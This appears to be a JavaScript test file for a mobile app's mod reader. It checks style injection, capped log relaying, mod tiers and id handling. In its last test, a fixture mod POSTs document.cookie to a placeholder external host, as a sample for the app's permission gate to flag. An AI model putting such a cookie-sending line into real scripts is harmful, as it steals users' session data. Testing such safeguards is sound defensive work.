'use strict';
// The phone's mod reader (mobile/shared/gen/mods.js, made from mobile/shared/modfile.js), as the app runs it: a
// free mod's style section (its CSS put on the page by TRIF's world, its values the code's trif.style), its
// window.trif.log lines and start on their way to the app's Diagnostics (capped), and boxed and style mods as
// before. Plain node, no browser: the page bits run against a small stand-in document.
//
//   node --test mobile/test/modfile.test.js

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');
const vm = require('vm');

const source = fs.readFileSync(path.join(__dirname, '..', 'shared', 'gen', 'mods.js'), 'utf8');
const reader = () => { const c = vm.createContext({ console }); vm.runInContext(source, c); return c.__trifMods; };
const R = reader();

const FREE = `// ==WebMod==
// @name        Big title
// @match       https://example.com/*
// ==/WebMod==
// ==Style==
// {
//   "css": ["h1 { font-size: var(--titleSize); color: var(--accent); }"],
//   "hide": [".ad"],
//   "settings": {
//     "accent":    { "type": "colour", "value": "#0866FF" },
//     "titleSize": { "type": "number", "value": 34, "min": 16, "max": 40, "unit": "px" },
//     "loud":      { "type": "on-off", "value": true }
//   }
// }
// ==/Style==
window.trif?.log?.('big title: ' + trif.style.titleSize + ' ' + trif.style.loud);
document.title = 'line 17';
`;

// A stand-in page: a document with events, elements and the bits the scripts touch; `told` is what reached
// TRIF's world's handler.
function page(href = 'https://example.com/a/b') {
  const listeners = {};
  const doc = {
    documentElement: { children: [], append(n) { this.children.push(n); } },
    head: null,
    addEventListener(type, fn) { (listeners[type] = listeners[type] || []).push(fn); },
    dispatchEvent(e) { for (const fn of listeners[e.type] || []) fn(e); return true; },
    createElement(tag) { return { tag, attrs: {}, textContent: '', setAttribute(k, v) { this.attrs[k] = v; } }; },
  };
  class CustomEvent { constructor(type, init) { this.type = type; this.detail = init && init.detail; } }
  const EventTarget = { prototype: { dispatchEvent(e) { return this.dispatchEvent(e); } } };
  const told = [];
  const quiet = { log() {}, warn() {}, error() {} };
  const g = { document: doc, location: new URL(href), URL, CustomEvent, EventTarget, console: quiet, JSON, told,
    webkit: { messageHandlers: { trif: { postMessage: (m) => told.push(m) } } }, addEventListener() {} };
  g.window = g; g.top = g; g.globalThis = g;
  return vm.createContext(g);
}

test('a free mod\'s style section: CSS in TRIF\'s world, values as trif.style', async () => {
  const r = R.readMod(FREE, { site: 'example.com' });
  assert.equal(r.error, undefined);
  assert.equal(r.tier, 'free');
  assert.equal(r.world, 'page');
  // (the CSS with the settings' values filled in, and the hide list)
  assert.match(r.styleScript, /font-size: 34px; color: #0866ff;/);
  assert.match(r.styleScript, /\.ad \{ display: none !important; \}/);
  assert.match(r.styleScript, /data-trif-style/);
  // (the section's text never reaches the code)
  assert.doesNotMatch(r.script, /==Style==|font-size/);
  assert.match(r.script, /"titleSize":34/);
  assert.match(r.script, /\/\/# sourceURL=trif:\/\/example\.com\/big-title\.js$/);

  // TRIF's world puts the style on the page, on a matching address only
  const tw = page();
  vm.runInContext(r.styleScript, tw);
  const st = tw.document.documentElement.children;
  assert.equal(st.length, 1);
  assert.equal(st[0].attrs['data-trif-style'], 'example.com/big-title');
  assert.match(st[0].textContent, /h1 \{ font-size: 34px;/);
  const other = page('https://other.org/');
  vm.runInContext(r.styleScript, other);
  assert.equal(other.document.documentElement.children.length, 0);

  // the page's world: trif.log from the mod's code, with its own trif.style; its start told once
  const p = page();
  vm.runInContext(R.freeRelayScript, p);
  vm.runInContext(R.freePageScript, p);
  vm.runInContext(r.script, p);
  vm.runInContext(r.script, p);
  await new Promise((res) => setTimeout(res, 10));
  assert.equal(p.document.title, 'line 17');
  assert.deepEqual(p.told.map((m) => [m.type, m.kind, m.mod, m.path, m.text]), [
    ['modlog', 'start', 'example.com/big-title', '/a/b', ''],
    ['modlog', 'log', 'example.com/big-title', '/a/b', 'big title: 34 true'],
    ['modlog', 'log', 'example.com/big-title', '/a/b', 'big title: 34 true'],
  ]);
});

test('a free mod\'s errors and log lines reach the app capped: 40 a load, 200 characters each', async () => {
  const mod = `// ==WebMod==
// @name   Noisy
// @match  https://example.com/*
// ==/WebMod==
for (let i = 0; i < 60; i++) window.trif.log('x'.repeat(500));
throw new Error('broke');
`;
  const r = R.readMod(mod, { site: 'example.com' });
  assert.equal(r.styleScript, '');
  assert.doesNotMatch(r.script, /const trif/);
  const p = page();
  vm.runInContext(R.freeRelayScript, p);
  vm.runInContext(R.freePageScript, p);
  vm.runInContext(r.script, p);
  await new Promise((res) => setTimeout(res, 10));
  assert.equal(p.told.length, 40);
  assert.ok(p.told.every((m) => m.text.length <= 200 + ' (no more lines from this page load)'.length));
  assert.equal(p.told[1].text.length, 200);
  assert.match(p.told[39].text, /no more lines/);
  // (still kept on the page for the chat and the Mods tab)
  assert.equal(vm.runInContext('JSON.stringify(window.__trifModErrors)', p), '["example.com/noisy: broke"]');

  // (the page's world first, as WebKit sometimes starts it: the lines wait for TRIF's world)
  const q = page();
  vm.runInContext(R.freePageScript, q);
  vm.runInContext(r.script.replace("for (let i = 0; i < 60; i++) window.trif.log('x'.repeat(500));", ''), q);
  await new Promise((res) => setTimeout(res, 10));
  assert.equal(q.told.length, 0);
  vm.runInContext(R.freeRelayScript, q);
  assert.deepEqual(q.told.map((m) => [m.kind, m.text]), [['start', ''], ['error', 'broke']]);
});

test('boxed and style mods as before: a boxed mod\'s section goes in its grant; neither has a style script', () => {
  const boxed = R.readMod(FREE.replace('// ==/WebMod==', '// @boxed\n// ==/WebMod==').replace("window.trif?.log?.('big title: ' + trif.style.titleSize + ' ' + trif.style.loud);", 'trif.log(trif.style.titleSize);'), { site: 'example.com' });
  assert.equal(boxed.error, undefined);
  assert.equal(boxed.tier, 'boxed');
  assert.equal(boxed.styleScript, '');
  assert.match(boxed.script, /"style":\{"css":"h1 \{ font-size: 34px; color: #0866ff; \}/);
  const style = R.readMod(`// ==WebMod==
// @name   Calm
// @match  https://example.com/*
// @style
// ==/WebMod==
{ "css": ".ad { display: none !important; }" }
`, { site: 'example.com' });
  assert.equal(style.error, undefined);
  assert.equal(style.tier, 'style');
  assert.equal(style.world, 'trif');
  assert.equal(style.styleScript, '');
});

test('a mod from a file keeps the file\'s name as its id, as the computer does (phone sync matches by it); a chat\'s keeps its @name', () => {
  const mod = `// ==WebMod==
// @name   Filter: AI content
// @match  https://www.facebook.com/*
// ==/WebMod==
document.body.dataset.x = '1';
`;
  const id = (opts) => R.readMod(mod, opts).id;
  // (Tim, 11-18: the computer's filter-ai.js came in as facebook.com/filter-ai-content and would have been a second mod)
  assert.equal(id({ file: 'facebook.com-filter-ai.js' }), 'facebook.com/filter-ai', 'the iCloud folder\'s / Send to iPhone\'s <site>-<name>.js');
  assert.equal(id({ file: 'filter-ai.js' }), 'facebook.com/filter-ai', 'a plain <name>.js');
  assert.equal(id({ file: 'phone~facebook.com-filter-ai.js' }), 'facebook.com/filter-ai', 'a phone twin\'s copy');
  assert.equal(id({ file: 'www.facebook.com-filter-ai.js' }), 'facebook.com/filter-ai');
  assert.equal(id({ file: 'Filter_AI.JS' }), 'facebook.com/Filter_AI', 'the computer\'s name as it is');
  assert.equal(id({ file: 'my mod (2).js' }), 'facebook.com/my-mod-2', 'a name the computer\'s sync couldn\'t take: cleaned');
  assert.equal(id({ file: 'facebook.com-.js' }), 'facebook.com/facebook.com-', 'nothing after the prefix: as it is');
  assert.equal(id({}), 'facebook.com/filter-ai-content', 'no file (a chat, pasted): its @name, as before');
  // (a mod read again under its kept id, or one from the computer by sync, keeps it: the prefix goes only for an import)
  assert.equal(id({ file: 'facebook-com-filter-ai.js', site: 'facebook.com' }), 'facebook.com/facebook-com-filter-ai', 'one imported before keeps its id');
  assert.equal(id({ file: 'facebook.com-x.js', site: 'facebook.com' }), 'facebook.com/facebook.com-x', 'a computer file named like that, by sync, stays');
});

// Stable ids (docs/PHONE-SYNC.md 2a, Tim 11-18): the reader keeps and reports the header's first valid @id; adding
// one (TRIF stamps it) or renaming changes nothing a hold reads: the needs and their lines stay, so an allowed mod
// stays allowed.
test('@id: the reader reports it; stamping it or a new @name never makes a mod wait', () => {
  const free = '// ==WebMod==\n// @name Sender\n// @match https://example.com/*\n// ==/WebMod==\nfetch("https://elsewhere.example/x", { method: "POST", body: document.cookie });\ndocument.querySelector("form").submit();\n';
  const plain = R.readMod(free, { site: 'example.com' });
  assert.equal(plain.uid, null, 'none: null');
  const uid = '3f2b8c1e-6d4a-4b7e-9c1f-2a5d8e7b9c01';
  const stamped = free.replace('// @name Sender\n', `// @name Sender\n// @id ${uid}\n`);
  const s = R.readMod(stamped, { site: 'example.com' });
  assert.equal(s.uid, uid);
  assert.equal(s.id, plain.id, 'its file id stays');
  assert.ok(plain.needs.length > 0, 'a free mod that sends asks');
  assert.deepEqual(s.needs, plain.needs, 'the same needs and lines with the id');
  const renamed = R.readMod(stamped.replace('@name Sender', '@name Quiet sender'), { site: 'example.com', file: 'sender.js' });
  assert.deepEqual(renamed.needs, plain.needs, 'the same needs renamed');
  const allowed = R.allow(plain.needs, {});
  assert.equal(R.waiting(s.needs, allowed).length, 0, 'what was allowed covers the stamped version');
  assert.equal(R.waiting(renamed.needs, allowed).length, 0, 'and the renamed one');
  assert.equal(R.readMod(free.replace('// @name Sender\n', '// @name Sender\n// @id NOT_AN_ID\n'), { site: 'example.com' }).uid, null, 'not an id: null');
  assert.equal(R.readMod(free.replace('// @name Sender\n', '// @name Sender\n// @id NOT_AN_ID\n// @id aaaaaaaa-2\n'), { site: 'example.com' }).uid, null, 'the first @id line counts');
  assert.equal(R.readMod(free.replace('// @name Sender\n', '// @name Sender\n// @id aaaaaaaa-1\n// @id aaaaaaaa-2\n'), { site: 'example.com' }).uid, 'aaaaaaaa-1');
});
